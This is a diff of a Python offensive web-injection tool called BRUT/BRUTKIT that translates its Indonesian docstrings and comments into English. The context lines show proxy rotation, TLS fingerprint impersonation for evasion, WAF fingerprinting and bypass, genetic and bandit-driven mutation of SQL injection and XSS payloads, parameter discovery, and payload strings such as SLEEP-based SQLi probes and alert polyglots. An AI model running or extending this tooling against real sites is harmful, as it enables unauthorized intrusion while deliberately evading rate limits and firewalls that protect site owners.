@@ -44,7 +44,7 @@ DB_FILE = "brut_targets.db"
 
 
 class TargetDatabase:
-    """Manajemen database SQLite untuk menyimpan target."""
+    """Manage the SQLite database used to store targets."""
 
     def __init__(self, db_path: str = DB_FILE):
         self.db_path = db_path
@@ -68,7 +68,7 @@ class TargetDatabase:
         self.conn.commit()
 
     def save_target(self, target: str) -> int:
-        """Simpan target, return ID yang diberikan."""
+        """Save a target and return its assigned ID."""
         cursor = self.conn.execute(
             "INSERT INTO targets (target) VALUES (?)", (target,)
         )
@@ -76,14 +76,14 @@ class TargetDatabase:
         return cursor.lastrowid
 
     def get_all_targets(self) -> list:
-        """Return semua target sebagai list of dict."""
+        """Return all targets as a list of dictionaries."""
         cursor = self.conn.execute(
             "SELECT id, target, created_at FROM targets ORDER BY id"
         )
         return [dict(row) for row in cursor.fetchall()]
 
     def get_target_by_id(self, target_id: int):
-        """Return target string berdasarkan ID, atau None."""
+        """Return the target string for an ID, or None when absent."""
         cursor = self.conn.execute(
             "SELECT target FROM targets WHERE id = ?", (target_id,)
         )
@@ -114,60 +114,60 @@ class TargetDatabase:
 
 
 def init_database() -> TargetDatabase:
-    """Inisialisasi database. Otomatis membuat file & tabel jika belum ada."""
+    """Initialize the database, creating its file and table when needed."""
     db = TargetDatabase()
     return db
 
 
 def clear_screen():
-    """Bersihkan layar terminal."""
+    """Clear the terminal screen."""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 
-# Event untuk menghentikan animasi welcome secara aman
+# Event used to stop the welcome animation safely.
 WELCOME_ANIM_STOP = threading.Event()
 
-# v7.0 (Batch 3): Global state untuk cancel/back mechanism
+# v7.0 (Batch 3): Global state for the cancel/back mechanism.
 CANCEL_EVENT = threading.Event()      # Set saat user konfirmasi /cancel
 PROGRESS_ACTIVE = False               # True saat pipeline sedang berjalan
 LOADED_TARGET_ID = None               # ID target yang di-load via /load (None = tidak ada)
 
-# Jarak baris animasi dari baris prompt input (konstan: 8 baris di atas prompt)
+# Animation line offset from the input prompt (always eight lines above it).
 WELCOME_ANIM_LINES_ABOVE = 8
 
 
 def _draw_welcome_line(content: str):
-    """Menulis HANYA di baris animasi (7 baris di atas prompt), tanpa menyentuh baris lain."""
+    """Write only to the animation line without disturbing other terminal lines."""
     sys.stdout.write(f"\033[s\033[{WELCOME_ANIM_LINES_ABOVE}A\r\033[2K\033[1;35m{content}\033[0m\033[u")
     sys.stdout.flush()
 
 
 def animate_welcome(text: str = "  ★ Welcome to BRUTKIT tools v1.0 — The creator team by AjaxCELL... ★",
                     delay: float = 0.05, pause: float = 1.2):
-    """Animasi ketik karakter per karakter, berulang tanpa henti, berhenti via WELCOME_ANIM_STOP."""
+    """Type the message repeatedly until WELCOME_ANIM_STOP is set."""
     while not WELCOME_ANIM_STOP.is_set():
-        # Ketik karakter satu per satu
+        # Type one character at a time.
         for i in range(len(text) + 1):
             if WELCOME_ANIM_STOP.is_set():
                 return
             _draw_welcome_line(text[:i])
             time.sleep(delay)
-        # Tahan kalimat lengkap sebentar
+        # Hold the complete message briefly.
         for _ in range(int(pause / 0.1)):
             if WELCOME_ANIM_STOP.is_set():
                 return
             time.sleep(0.1)
-        # Hapus, lalu ulangi
+        # Clear the message and repeat.
         _draw_welcome_line("")
         time.sleep(0.4)
 
 
 def stop_welcome_animation(anim_thread):
-    """Hentikan animasi & bersihkan baris animasi yang tersisa di scrollback."""
+    """Stop the animation and clear its remaining terminal line."""
     WELCOME_ANIM_STOP.set()
     if anim_thread is not None and anim_thread.is_alive():
         anim_thread.join(timeout=1.0)
-    # Setelah Enter, kursor turun 1 baris → baris animasi kini (8+1)=9 baris di atas kursor
+    # After Enter, the cursor moves down one line, so the animation is nine lines above it.
     sys.stdout.write(f"\033[s\033[{WELCOME_ANIM_LINES_ABOVE + 1}A\r\033[2K\033[u")
     sys.stdout.flush()
 
@@ -213,7 +213,7 @@ STATUS_MEANINGS = {
 }
 
 def get_status_meaning(code: int) -> str:
-    """Mengubah kode status HTTP menjadi keterangan singkat untuk laporan."""
+    """Convert an HTTP status code into a short report description."""
     return STATUS_MEANINGS.get(code, f"Unknown Status ({code})")
 
 
@@ -240,7 +240,7 @@ REQUIRED_DEPS = [
 
 
 def install_dependencies():
-    """Memeriksa lalu mencoba memasang dependency yang tercantum di daftar."""
+    """Check and attempt to install the dependencies listed in the script."""
     print("\n\033[36m" + "=" * 60)
     print("  BRUT v6.0.1: Dependency Manager")
     print("=" * 60 + "\033[0m\n")
@@ -400,7 +400,7 @@ except ImportError:
 # BANNER v6.0.1
 # ============================================================
 def print_banner():
-    """Menampilkan identitas dan informasi versi BRUT di terminal."""
+    """Display the BRUT identity and version information in the terminal."""
     banner = f"""
 \033[1;36m                   
   __ )                |          |    _)  |   
@@ -425,7 +425,7 @@ def print_banner():
 # ============================================================
 @dataclass
 class ProxyInfo:
-    """Menyimpan status kesehatan, statistik, dan cooldown sebuah proxy."""
+    """Store a proxy's health status, statistics, and cooldown state."""
     url: str
     protocol: str = "http"       # http, https, socks4, socks5
     health_score: float = 1.0    # 0.0 (dead) to 1.0 (healthy)
@@ -445,7 +445,7 @@ class ProxyInfo:
 
 
 class ProxyPoolManager:
-    """Mengelola rotasi proxy, health check, cooldown, dan circuit breaker."""
+    """Manage proxy rotation, health checks, cooldowns, and circuit breaking."""
     """
     Manages proxy pool with automatic circuit breaker.
     - Rotates proxies on 429/403/timeout
@@ -644,7 +644,7 @@ class ProxyPoolManager:
 # TLS FINGERPRINT ENGINE (v6.0 — JA3/JA4 Evasion)
 # ============================================================
 class TLSFingerprintEngine:
-    """Membuat client HTTP dengan variasi fingerprint TLS dan header."""
+    """Create HTTP clients with varied TLS fingerprints and headers."""
     IMPERSONATION_TARGETS = [
         "chrome120", "chrome119", "chrome116", "chrome110",
         "chrome107", "chrome104", "chrome101", "chrome99",
@@ -737,7 +737,7 @@ class TLSFingerprintEngine:
 # ADAPTIVE THROTTLER (v6.0 — Human-Like Delay + Backoff)
 # ============================================================
 class AdaptiveThrottler:
-    """Mengatur jeda request berdasarkan latensi dan indikasi rate limit."""
+    """Adjust request delays based on latency and rate-limit signals."""
     def __init__(self, min_delay: float = 0.3, max_delay: float = 2.5,
                  burst_limit: int = 15, burst_window: float = 10.0):
         self.min_delay = min_delay
@@ -765,17 +765,17 @@ class AdaptiveThrottler:
         """
         now = time.time()
         
-        # Jika ada response time terbaru, simpan
+        # Store the latest response time when available.
         if current_response_time is not None and current_response_time > 0:
             self.response_time_history.append(current_response_time)
             if len(self.response_time_history) > 20:
                 self.response_time_history = self.response_time_history[-20:]
         
-        # Butuh minimal 5 data untuk prediksi
+        # At least five data points are required for prediction.
         if len(self.response_time_history) < 5:
             return False, 0.0
         
-        # Hitung tren: bandingkan rata-rata 5 terakhir dengan 5 sebelumnya
+        # Calculate the trend by comparing the latest five averages with the previous five.
         recent = self.response_time_history[-5:]
         older = self.response_time_history[-10:-5] if len(self.response_time_history) >= 10 else self.response_time_history[:-5]
         
@@ -785,15 +785,15 @@ class AdaptiveThrottler:
         avg_recent = sum(recent) / len(recent)
         avg_older = sum(older) / len(older)
         
-        # Jika response time meningkat lebih dari 20% dalam 5 request terakhir
+        # Detect a response-time increase greater than 20% across the latest five requests.
         if avg_older > 0 and (avg_recent / avg_older) > 1.2:
             self.consecutive_slow_responses += 1
         else:
             self.consecutive_slow_responses = max(0, self.consecutive_slow_responses - 1)
         
-        # Jika ada 3+ peningkatan berturut-turut, prediksi rate limit
+        # Predict a rate limit after three or more consecutive increases.
         if self.consecutive_slow_responses >= 3:
-            # Hitung backoff berdasarkan tingkat kenaikan
+            # Calculate backoff from the increase ratio.
             ratio = avg_recent / avg_older
             backoff = min(10.0, 2.0 * ratio)  # max 10 detik
             return True, backoff
@@ -902,7 +902,7 @@ class AdaptiveThrottler:
 # RETRY ENGINE (v6.0 — Tenacity-Based Smart Retry)
 # ============================================================
 class RetryEngine:
-    """Menjalankan request ulang dengan backoff dan aturan retry adaptif."""
+    """Retry requests using backoff and adaptive retry rules."""
     RETRYABLE_STATUS_CODES = {429, 403, 408, 500, 502, 503, 504, 520, 521, 522, 523}
     MAX_RETRIES = 4
     BASE_WAIT = 2
@@ -1191,7 +1191,7 @@ class MutationType(Enum):
 # ============================================================
 @dataclass
 class EvolutionRecord:
-    """Mewakili satu catatan payload dan hasil evolusinya."""
+    """Represent one payload record and its evolution results."""
     generation_id: str = ""
     parent_payload_id: str = ""
     generation_number: int = 0
@@ -1212,7 +1212,7 @@ class EvolutionRecord:
 
 
 class EvolutionSchema:
-    """Menyimpan riwayat generasi, feedback, fitness, dan directive evolusi."""
+    """Store generation history, feedback, fitness, and evolution directives."""
     def __init__(self):
         self.records: Dict[str, EvolutionRecord] = {}
         self.generation_counter = 0
@@ -1396,7 +1396,7 @@ class EvolutionSchema:
 # GRAMMAR VALIDATOR (preserved from v5.0)
 # ============================================================
 class GrammarValidator:
-    """Memeriksa struktur dasar payload berdasarkan kategori injeksinya."""
+    """Check basic payload structure according to its injection category."""
     SQL_KEYWORD_ORDER = [
         "SELECT", "FROM", "WHERE", "GROUP BY", "HAVING",
         "ORDER BY", "LIMIT", "UNION", "INSERT", "UPDATE",
@@ -1496,7 +1496,7 @@ class GrammarValidator:
 # CONTEXT DETECTOR (preserved from v5.0)
 # ============================================================
 class ContextDetector:
-    """Mendeteksi konteks refleksi parameter dari isi respons HTTP."""
+    """Detect parameter reflection context from an HTTP response body."""
     def __init__(self):
         self.context_patterns = {
             InjectionContext.SQL_STRING: [
@@ -1583,7 +1583,7 @@ class ContextDetector:
 # WAF BYPASS ENGINE (preserved from v5.0)
 # ============================================================
 class WAFBypassEngine:
-    """Menyediakan transformasi payload untuk menguji variasi parsing WAF."""
+    """Provide payload transformations for testing WAF parsing variations."""
     CONTROL_CHARS = ["%00", "%01", "%02", "%03", "%04", "%05",
                      "%06", "%07", "%08", "%09", "%0b", "%0c",
                      "%0e", "%0f", "%10", "%11", "%12", "%13",
@@ -1607,7 +1607,7 @@ class WAFBypassEngine:
             key = param_name
             if key not in result:
                 result[key] = []
-            # v7.0 FIX: urlencode setiap bagian HPP untuk memastikan encoding konsisten
+            # v7.0 FIX: URL-encode each HPP part for consistent encoding.
             result[key].append(urlencode({key: part}, doseq=True).split("=", 1)[-1] if "=" in urlencode({key: part}) else part)
         return result
 
@@ -1720,7 +1720,7 @@ class WAFBypassEngine:
 # ADAPTIVE ENCODING ROTATION (preserved from v5.0)
 # ============================================================
 class AdaptiveEncodingRotation:
-    """Memutar rantai encoding berdasarkan hasil pengujian sebelumnya."""
+    """Rotate encoding chains based on previous test results."""
     ENCODING_CHAINS = [
         ["raw"], ["url_encode"], ["double_url_encode"], ["hex_encode"],
         ["html_entity"], ["unicode_escape"],
@@ -1811,7 +1811,7 @@ class AdaptiveEncodingRotation:
 # MULTI-ARMED BANDIT MUTATION SELECTOR (v6.1 — UCB1 Algorithm)
 # ============================================================
 class MutationBanditSelector:
-    """Memilih mutasi memakai skor UCB1 dan feedback per tipe WAF."""
+    """Select mutations using UCB1 scores and per-WAF feedback."""
     """
     Implements Upper Confidence Bound (UCB1) algorithm for adaptive mutation selection.
     Each mutation type is treated as an "arm" of a multi-armed bandit.
@@ -1943,7 +1943,7 @@ class ThompsonSamplingBandit:
         self.counts = {m: 0 for m in mutation_types}
         
     def select_mutation(self, waf_type: str = "") -> str:
-        """Sample dari distribusi Beta, pilih yang tertinggi."""
+        """Sample from Beta distributions and select the highest value."""
         samples = {}
         for m in self.mutation_types:
             samples[m] = np.random.beta(self.alpha[m], self.beta_param[m])
@@ -1953,7 +1953,7 @@ class ThompsonSamplingBandit:
         return selected
     
     def update_reward(self, mutation: str, reward: float, waf_type: str = ""):
-        """Update distribusi Beta berdasarkan reward."""
+        """Update Beta distributions based on the reward."""
         if mutation not in self.alpha:
             self.alpha[mutation] = 1.0
             self.beta_param[mutation] = 1.0
@@ -1966,7 +1966,7 @@ class ThompsonSamplingBandit:
             self.beta_param[mutation] += (1.0 - max(0.0, reward))
     
     def get_best_mutations(self, top_k: int = 5, waf_type: str = "") -> List[Tuple[str, float]]:
-        """Top-k mutasi berdasarkan expected value Beta."""
+        """Return the top-k mutations by expected Beta value."""
         avg_rewards = []
         for m in self.mutation_types:
             if self.counts[m] > 0:
@@ -2002,7 +2002,7 @@ class ThompsonSamplingBandit:
 # HYBRID BANDIT SELECTOR (v7.0 — Auto-Switch UCB1 ↔ Thompson)
 # ============================================================
 class HybridBanditSelector:
-    """Menggabungkan selector UCB1 dan Thompson untuk pemilihan mutasi."""
+    """Combine UCB1 and Thompson selectors for mutation selection."""
     """
     Wrapper yang menggabungkan UCB1 dan Thompson Sampling.
     Otomatis beralih berdasarkan fase serangan:
@@ -2185,7 +2185,7 @@ from sklearn.cluster import DBSCAN
 import numpy as np
 
 class SemanticPayloadClusterer:
-    """Mengelompokkan payload serupa untuk mengurangi pengujian berulang."""
+    """Cluster similar payloads to reduce repeated testing."""
     """
     Groups payloads into semantic clusters using TF-IDF embeddings and DBSCAN.
     Enables bulk blacklisting of entire clusters when any member is blocked.
@@ -2290,7 +2290,7 @@ from sklearn.preprocessing import LabelEncoder
 import re
 
 class WAFFingerprinter:
-    """Mengidentifikasi WAF dari status, header, dan isi respons."""
+    """Identify a WAF from response status, headers, and body content."""
     """
     Classifies WAF types in real-time based on HTTP response characteristics.
     Uses headers, status codes, and body patterns to predict WAF vendor.
@@ -2496,7 +2496,7 @@ class WAFFingerprinter:
 # WAF SIGNATURE INFERENCE ENGINE (v6.2 — Adaptive Bypass)
 # ============================================================
 class WAFSignatureInference:
-    """Menyimpulkan pola signature WAF dari payload yang diblokir."""
+    """Infer WAF signature patterns from blocked payloads."""
     """
     Learns which substrings/patterns trigger WAF blocking by comparing
     blocked vs unblocked payloads. Then generates targeted mutations
@@ -2518,12 +2518,12 @@ class WAFSignatureInference:
         
     def record_result(self, payload: str, response_text: str, was_blocked: bool):
         """Store feedback from each test."""
-        # v7.0 FIX: Decode payload sebelum disimpan agar analisis n-gram
-        # bekerja pada bentuk asli, bukan bentuk encoded
+        # v7.0 FIX: Decode the payload before storage so n-gram analysis
+        # operates on the original rather than encoded form.
         decoded_payload = payload
         try:
             decoded_payload = unquote(payload)
-            # Decode dua kali untuk double-encoding
+            # Decode twice for double-encoding.
             if decoded_payload != payload:
                 decoded_payload = unquote(decoded_payload)
         except Exception:
@@ -2667,7 +2667,7 @@ class WAFSignatureInference:
 # ============================================================
 
 class GranularRewardEngine:
-    """Menghitung reward terperinci dari status dan karakteristik respons."""
+    """Calculate detailed rewards from response status and characteristics."""
     """
     Computes fine-grained rewards based on multiple response signals.
     Includes progressive penalties for rate-limiting (429) and IP blocking.
@@ -2775,7 +2775,7 @@ class GranularRewardEngine:
 # STATISTICAL ANOMALY DETECTOR (v7.0 — scipy_stats + cosine + KMeans)
 # ============================================================
 class StatisticalAnomalyDetector:
-    """Mendeteksi anomali waktu dan kemiripan body pada respons HTTP."""
+    """Detect timing and body-similarity anomalies in HTTP responses."""
     """
     Deteksi anomali berbasis statistik:
     - scipy_stats.zscore     → timing anomaly (Blind SQLi SLEEP)
@@ -2795,7 +2795,7 @@ class StatisticalAnomalyDetector:
         self.response_times.append(elapsed_ms)
 
     def detect_timing_anomaly(self, current_ms: float, threshold: float = 2.5) -> bool:
-        """Return True jika response time saat ini > threshold z-score."""
+        """Return True when the current response time exceeds the z-score threshold."""
         if not HAS_SCIPY or len(self.response_times) < 5:
             return False
         try:
@@ -2827,13 +2827,13 @@ class StatisticalAnomalyDetector:
 
     # ---------- scipy_cosine: payload distance ----------
     def payload_cosine_distance(self, payload_a: str, payload_b: str) -> float:
-        """Return cosine distance [0..2] antara dua payload (untuk dedup)."""
+        """Return cosine distance [0..2] between two payloads for deduplication."""
         if not HAS_SCIPY:
             return 1.0
         try:
             va = self._body_to_vector(payload_a)
             vb = self._body_to_vector(payload_b)
-            # scipy_cosine raise error jika vektor semua nol
+            # scipy_cosine raises an error when all vector values are zero.
             if sum(va) == 0 or sum(vb) == 0:
                 return 1.0
             return float(scipy_cosine(va, vb))
@@ -2872,7 +2872,7 @@ class StatisticalAnomalyDetector:
 # DOMAIN SCOPE VALIDATOR (v7.0 — tldextract)
 # ============================================================
 class DomainScopeValidator:
-    """Memastikan URL yang ditemukan masih berada dalam scope domain target."""
+    """Ensure discovered URLs remain within the target domain scope."""
     """
     Memastikan semua request tetap dalam scope domain target.
     Menggunakan tldextract untuk parsing domain yang akurat
@@ -2888,12 +2888,12 @@ class DomainScopeValidator:
             self.allowed_domain = f"{ext.domain}.{ext.suffix}"
             self.allowed_subdomains.add(ext.subdomain)
         else:
-            # Fallback: gunakan urlparse
+            # Fallback: use urlparse.
             parsed = urlparse(target_url)
             self.allowed_domain = parsed.netloc
 
     def is_in_scope(self, url: str) -> bool:
-        """Return True jika URL masih dalam scope domain target."""
+        """Return True when a URL remains within the target domain scope."""
         if not HAS_TLDEXTRACT:
             parsed = urlparse(url)
             return parsed.netloc == self.allowed_domain
@@ -2910,14 +2910,14 @@ class DomainScopeValidator:
         return f"{ext.domain}.{ext.suffix}"
 
     def add_allowed_subdomain(self, subdomain: str):
-        """Tambahkan subdomain yang diizinkan."""
+        """Add an allowed subdomain."""
         self.allowed_subdomains.add(subdomain)
 
 # ============================================================
 # FAST HTML PARSER (v7.0 — SelectolaxParser fallback)
 # ============================================================
 class FastHTMLParser:
-    """Mengekstrak form, link, dan sumber script dari HTML secara ringan."""
+    """Lightly extract forms, links, and script sources from HTML."""
     """
     Parser HTML cepat menggunakan selectolax (jika tersedia).
     Fallback ke regex jika selectolax tidak terinstall.
@@ -2926,7 +2926,7 @@ class FastHTMLParser:
 
     @staticmethod
     def extract_forms(html: str) -> list:
-        """Ekstrak semua form dari HTML. Return list of dict."""
+        """Extract all forms from HTML and return a list of dictionaries."""
         forms = []
         if HAS_SELECTOLAX:
             try:
@@ -2955,7 +2955,7 @@ class FastHTMLParser:
 
     @staticmethod
     def extract_links(html: str) -> list:
-        """Ekstrak semua href dari tag <a>. Return list of str."""
+        """Extract all href values from <a> tags and return a list of strings."""
         links = []
         if HAS_SELECTOLAX:
             try:
@@ -2973,7 +2973,7 @@ class FastHTMLParser:
 
     @staticmethod
     def extract_scripts_src(html: str) -> list:
-        """Ekstrak semua src dari tag <script>. Return list of str."""
+        """Extract all src values from <script> tags and return a list of strings."""
         srcs = []
         if HAS_SELECTOLAX:
             try:
@@ -2992,7 +2992,7 @@ class FastHTMLParser:
 # CONCURRENT ENDPOINT SCANNER (v7.0 — ThreadPoolExecutor + HTTPAdapter/Retry)
 # ============================================================
 class ConcurrentEndpointScanner:
-    """Memindai daftar path secara paralel menggunakan thread worker."""
+    """Scan a list of paths in parallel using worker threads."""
     """
     Parallel endpoint discovery.
     - ThreadPoolExecutor  → probing concurrent
@@ -3014,7 +3014,7 @@ class ConcurrentEndpointScanner:
         self._session = None
 
     def _build_resilient_session(self):
-        """requests.Session dengan HTTPAdapter + Retry (pooling + auto-retry)."""
+        """Create a requests.Session with HTTPAdapter and automatic retries."""
         if requests is None:
             return None
         session = requests.Session()
@@ -3045,7 +3045,7 @@ class ConcurrentEndpointScanner:
         return session
 
     def _probe(self, path: str):
-        """Probe satu endpoint. Return dict jika hidup, selain itu None."""
+        """Probe one endpoint and return a dictionary when reachable, otherwise None."""
         if self._session is None:
             return None
         url = f"{self.base_url}/{path.lstrip('/')}"
@@ -3063,7 +3063,7 @@ class ConcurrentEndpointScanner:
         return None
 
     def scan(self, paths=None):
-        """Parallel scan dengan ThreadPoolExecutor + as_completed."""
+        """Scan in parallel with ThreadPoolExecutor and as_completed."""
         if requests is None:
             return []
         if self._session is None:
@@ -3090,7 +3090,7 @@ class ConcurrentEndpointScanner:
 # ASYNC ENDPOINT SCANNER (v7.0 — aiohttp)
 # ============================================================
 class AsyncEndpointScanner:
-    """Memindai daftar path secara asynchronous dengan batas concurrency."""
+    """Asynchronously scan paths with a concurrency limit."""
     """
     Async endpoint discovery menggunakan aiohttp.
     Lebih cepat dari ConcurrentEndpointScanner untuk target
@@ -3106,7 +3106,7 @@ class AsyncEndpointScanner:
         self.discovered = []
 
     async def _probe_one(self, session, path: str):
-        """Probe satu endpoint secara async."""
+        """Asynchronously probe one endpoint."""
         url = f"{self.base_url}/{path.lstrip('/')}"
         try:
             async with session.get(
@@ -3127,7 +3127,7 @@ class AsyncEndpointScanner:
         return None
 
     async def _scan_async(self, paths: list):
-        """Jalankan semua probe secara concurrent dengan semaphore."""
+        """Run all probes concurrently under a semaphore limit."""
         semaphore = asyncio.Semaphore(self.max_concurrent)
         results = []
 
@@ -3164,7 +3164,7 @@ class AsyncEndpointScanner:
 # PAYLOAD DIVERSITY ENGINE (v7.0 — string + itertools + quote_plus)
 # ============================================================
 class PayloadDiversityEngine:
-    """Membuat variasi payload melalui padding dan kombinasi encoding."""
+    """Create payload variants through padding and encoding combinations."""
     """
     Menghasilkan variasi payload tambahan menggunakan:
     - string.ascii_letters/digits/punctuation untuk junk injection
@@ -3180,7 +3180,7 @@ class PayloadDiversityEngine:
     }
     
     def generate_junk_padding(self, payload: str, density: float = 0.15) -> str:
-        """Sisipkan karakter junk dari string module ke dalam payload."""
+        """Insert junk characters from the string module into a payload."""
         junk_chars = string.ascii_letters + string.digits
         result = list(payload)
         insertions = max(1, int(len(payload) * density))
@@ -3190,7 +3190,7 @@ class PayloadDiversityEngine:
         return "".join(result)
     
     def generate_encoding_combinations(self, payload: str, max_depth: int = 2) -> List[str]:
-        """Gunakan itertools.product untuk menghasilkan semua kombinasi encoding."""
+        """Use itertools.product to generate all encoding combinations."""
         variants = []
         encoding_names = list(self.ENCODING_FUNCS.keys())
         for depth in range(1, max_depth + 1):
@@ -3210,7 +3210,7 @@ class PayloadDiversityEngine:
         return quote_plus(payload, safe="'\"")
     
     def diversify_batch(self, payloads: List[Dict], count: int = 5) -> List[Dict]:
-        """Hasilkan batch payload diversifikasi dari populasi yang ada."""
+        """Generate a diversified payload batch from the existing population."""
         if not payloads:
             return []
         diversified = []
@@ -3227,8 +3227,8 @@ class PayloadDiversityEngine:
                 new_payload = random.choice(combos) if combos else original
             else:
                 new_payload = self.quote_plus_encode(original)
-            # v7.0 (Batch 8): Dedup via scipy_cosine — skip jika terlalu mirip
-            # dengan payload yang sudah ada di batch ini
+            # v7.0 (Batch 8): Deduplicate with scipy_cosine and skip payloads
+            # that are too similar to an existing payload in this batch.
             is_dup = False
             if HAS_SCIPY:
                 try:
@@ -3261,7 +3261,7 @@ class PayloadDiversityEngine:
 # POLYGLOT GENERATOR (preserved from v5.0)
 # ============================================================
 class PolyglotGenerator:
-    """Menghasilkan payload gabungan untuk beberapa konteks parser."""
+    """Generate combined payloads for multiple parser contexts."""
     def generate_sql_xss_polyglot(self) -> List[str]:
         return [
             "';alert(1);//", "';</script><script>alert(1)</script>;//",
@@ -3320,7 +3320,7 @@ class PolyglotGenerator:
 # GENETIC EVOLVER (preserved from v5.0)
 # ============================================================
 class GeneticEvolver:
-    """Mengembangkan populasi payload melalui seleksi, crossover, dan mutasi."""
+    """Evolve a payload population through selection, crossover, and mutation."""
     def __init__(self, schema: EvolutionSchema, grammar: GrammarValidator,
                  encoder: AdaptiveEncodingRotation, waf_bypass: WAFBypassEngine, waf_inference: WAFSignatureInference = None):
         self.schema = schema
@@ -3517,27 +3517,27 @@ class GeneticEvolver:
         # tambahan
         # v6.2: WAF Signature Inference - targeted evasion
         if self.waf_inference and self.waf_inference.inferred_signatures:
-            # Coba hasilkan mutasi evasion berdasarkan inferred signatures
+            # Try to generate an evasion mutation from inferred signatures.
             inferred_payload = self.waf_inference.generate_evasion_mutation(payload, category)
             if inferred_payload != payload:
                 # Validasi grammar
                 is_valid, _ = self.grammar.validate(inferred_payload, category)
                 if is_valid:
-                    # Gunakan hasil inferensi sebagai base, kurangi jumlah mutasi acak
+                    # Use the inferred result as the base and reduce random mutations.
                     result = inferred_payload
                     # Batasi mutasi tambahan agar tidak merusak evasion
                     num_muts = min(num_muts, 1)
-                    # Tandai bahwa ini berasal dari inferensi
+                    # Mark this payload as inference-derived.
                     mutations_applied = ["waf_inference_evasion"]
 
-        # v6.1 NEW: Ambil status WAF dari schema untuk konteks bandit
+        # v6.1 NEW: Read WAF status from the schema for bandit context.
         waf_type = getattr(self.schema, 'waf_type', '') or ''
         
         for _ in range(num_muts):
-            # v6.1 NEW: Gunakan UCB1 Bandit alih-alih random.choice
+            # v6.1 NEW: Use the UCB1 bandit instead of random.choice.
             mut_name = self.bandit.select_mutation(waf_type=waf_type)
             
-            # Fallback: Jika bandit memilih mutasi yang tidak tersedia/diblokir
+            # Fallback: if the bandit selects an unavailable or blocked mutation.
             if mut_name not in available:
                 mut_name = random.choice(list(available.keys()))
                 
@@ -3651,7 +3651,7 @@ class GeneticEvolver:
 # ============================================================
 @dataclass
 class Parameter:
-    """Mewakili parameter target beserta lokasi dan kategori yang ditemukan."""
+    """Represent a discovered target parameter, location, and category."""
     name: str
     location: str
     method: str = "GET"
@@ -3668,7 +3668,7 @@ class Parameter:
 
 
 class ParameterDiscovery:
-    """Menemukan parameter dari URL, form, JavaScript, dan endpoint target."""
+    """Discover parameters from target URLs, forms, JavaScript, and endpoints."""
     COMMON_PARAMS = [
         "id", "page", "p", "pid", "cid", "uid", "cat", "category",
         "post", "article", "news", "item", "product", "order",
@@ -3804,7 +3804,7 @@ class ParameterDiscovery:
                 ))
 
     def _extract_form_params(self, html: str):
-        # v7.0 (Batch 8): Gunakan FastHTMLParser (selectolax) jika tersedia
+        # v7.0 (Batch 8): Use FastHTMLParser (selectolax) when available.
         if HAS_SELECTOLAX:
             try:
                 fast_forms = FastHTMLParser.extract_forms(html)
@@ -4075,7 +4075,7 @@ class ParameterDiscovery:
 # FEEDBACK LEARNER (preserved from v5.0 + v6.0 rate limit tracking)
 # ============================================================
 class FeedbackLearner:
-    """Memperbarui bobot generator berdasarkan hasil respons sebelumnya."""
+    """Update generator weights based on previous response results."""
     def __init__(self):
         self.category_scores = defaultdict(lambda: {"success": 0, "fail": 0, "raw_html": 0, "blocked": 0})
         self.encoding_scores = defaultdict(lambda: {"success": 0, "fail": 0})
@@ -4236,7 +4236,7 @@ class FeedbackLearner:
 # ML PAYLOAD GENERATOR (preserved from v5.0)
 # ============================================================
 class MLPayloadGenerator:
-    """Membangun payload berbasis atom, encoding, dan strategi mutasi."""
+    """Build payloads from atoms, encodings, and mutation strategies."""
     ATOMS = {
         "sql_string_break": ["'",'"',"`","''",'""',"\\'","\\\"","%27","%22"],
         "sql_logic": ["OR","AND","XOR","NOT","&&","||","DIV"],
@@ -4794,7 +4794,7 @@ class MLPayloadGenerator:
 # ============================================================
 @dataclass
 class InjectionResult:
-    """Menyimpan metadata lengkap dari satu percobaan injection HTTP."""
+    """Store complete metadata for one HTTP injection attempt."""
     payload_id: str
     payload: str
     category: str
@@ -4821,7 +4821,7 @@ class InjectionResult:
 
 
 class ResponseAnalyzer:
-    """Mengklasifikasikan respons menjadi output server, HTML biasa, atau blocked."""
+    """Classify responses as server output, normal HTML, or blocked."""
     SERVER_ERROR_PATTERNS = [
         r"sql\s*syntax",r"mysql",r"oracle",r"postgresql",r"sqlite",
         r"unclosed\s*quotation",r"syntax\s*error.*?(near|at)",
@@ -4912,7 +4912,7 @@ class ResponseAnalyzer:
 # INJECTOR v6.0.1 (Enhanced with Proxy + TLS + Throttle + Retry + httpx fix)
 # ============================================================
 class Injector:
-    """Mengirim payload ke parameter target dan menganalisis responsnya."""
+    """Send payloads to target parameters and analyze their responses."""
     def __init__(self, target, proxy_manager: ProxyPoolManager = None,
                  tls_engine: TLSFingerprintEngine = None,
                  throttler: AdaptiveThrottler = None,
@@ -5019,7 +5019,7 @@ class Injector:
         if HAS_REQUESTS:
             start = time.time()
             
-            # v7.0 (Batch 7): Gunakan tenacity untuk retry otomatis pada requests fallback
+            # v7.0 (Batch 7): Use tenacity for automatic retries on the requests fallback.
             if HAS_TENACITY:
                 @retry(
                     stop=stop_after_attempt(3),
@@ -5181,7 +5181,7 @@ class Injector:
 # REPORT SAVER (v6.0 enhanced)
 # ============================================================
 class ReportSaver:
-    """Menyimpan hasil pengujian dalam laporan teks dan JSON."""
+    """Save test results as text and JSON reports."""
     def __init__(self, target, output_dir="./brut_results"):
         self.target = target
         self.parsed = urlparse(target)
@@ -5298,7 +5298,7 @@ class ReportSaver:
 # DETAILED LOGGER (v6.0 enhanced with proxy/TLS info)
 # ============================================================
 class DetailedLogger:
-    """Menampilkan hasil setiap request dengan status dan metadata ringkas."""
+    """Display each request result with status and concise metadata."""
     @staticmethod
     def log_result(index, total, result):
         if result.success:
@@ -5370,22 +5370,22 @@ class SecondOrderConfirmer:
         self.confirmed_vulnerabilities: List[Dict] = []
         
     def should_verify(self, result: InjectionResult) -> bool:
-        """Tentukan apakah sebuah hasil perlu diverifikasi lebih lanjut."""
-        # Jika sudah jelas server_output, verifikasi tetap baik untuk konfirmasi
+        """Determine whether a result requires further verification."""
+        # Verify even clear server_output results for additional confirmation.
         if result.response_type == "server_output":
             return True
-        # Jika ada anomaly tinggi tapi bukan server_output, coba verifikasi
+        # Verify high-anomaly results that are not server_output.
         if result.anomaly_score > 70:
             return True
-        # Jika status code 500 dan ada indikasi error, verifikasi
+        # Verify status 500 responses when error evidence is present.
         if result.status_code >= 500:
             return True
         return False
         
     def generate_verification_payload(self, original_payload: str, category: str) -> str:
-        """Buat payload verifikasi berdasarkan kategori."""
+        """Create a verification payload based on the category."""
         if category == "sqli":
-            # Gunakan SLEEP atau benchmark
+            # Use SLEEP or benchmark variants.
             delay = random.randint(3, 7)
             variants = [
                 f"' OR SLEEP({delay})-- -",
